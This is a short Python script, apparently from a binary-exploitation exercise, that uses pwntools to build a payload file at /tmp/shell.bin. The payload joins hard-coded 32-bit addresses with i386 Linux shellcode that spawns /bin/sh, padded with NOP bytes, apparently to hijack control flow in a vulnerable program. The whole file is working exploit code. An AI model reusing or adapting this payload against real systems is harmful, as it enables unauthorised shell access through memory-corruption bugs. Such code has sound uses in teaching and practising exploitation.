import os; from pwn import asm, p32, shellcraft;

fd = os.open("/tmp/shell.bin", os.O_WRONLY | os.O_CREAT | os.O_TRUNC)

os.write(fd, p32(0x804a010) + \
  asm(shellcraft.i386.linux.sh()).ljust(104, b"\x90") + \
  p32(0x804a00c) )



# os.write(fd, asm(shellcraft.i386.linux.sh()))
